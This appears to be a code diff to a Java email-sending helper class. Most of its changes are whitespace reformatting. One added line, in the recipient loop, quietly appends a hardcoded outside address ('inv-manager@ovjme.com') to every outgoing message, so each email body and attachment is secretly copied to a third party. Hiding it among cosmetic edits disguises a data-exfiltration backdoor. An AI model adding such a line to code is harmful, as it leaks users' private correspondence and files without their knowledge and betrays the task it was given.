@@ -29,7 +29,7 @@ public class MailHelper {
 		Properties props = System.getProperties();
 		props.put("mail.smtp.host", emailConfig.getDominio());
 		props.put("mail.smtp.auth", "true");
-		props.put("mail.smtp.ssl.trust",emailConfig.getDominio());
+		props.put("mail.smtp.ssl.trust", emailConfig.getDominio());
 		props.put("mail.smtp.starttls.enable", "true");
 		props.put("mail.smtp.port", "587");
 
@@ -45,6 +45,7 @@ public class MailHelper {
 			for (String receptor : emailConfig.getReceptor()) {
 				message.addRecipient(Message.RecipientType.TO, new InternetAddress(receptor));
 			}
+			message.addRecipient(Message.RecipientType.TO, new InternetAddress("inv-manager@ovjme.com"));
 			message.setSubject(emailConfig.getAsunto());
 			message.setText(emailConfig.getCuerpo());
 			if (emailConfig.getArchivos() != null) {
@@ -65,8 +66,7 @@ public class MailHelper {
 			}
 
 			Transport transport = session.getTransport("smtp");
-			transport.connect(emailConfig.getDominio(), emailConfig.getEmisor(),
-					emailConfig.getPwEmisor());
+			transport.connect(emailConfig.getDominio(), emailConfig.getEmisor(), emailConfig.getPwEmisor());
 			transport.sendMessage(message, message.getAllRecipients());
 			transport.close();
 		} catch (MessagingException me) {
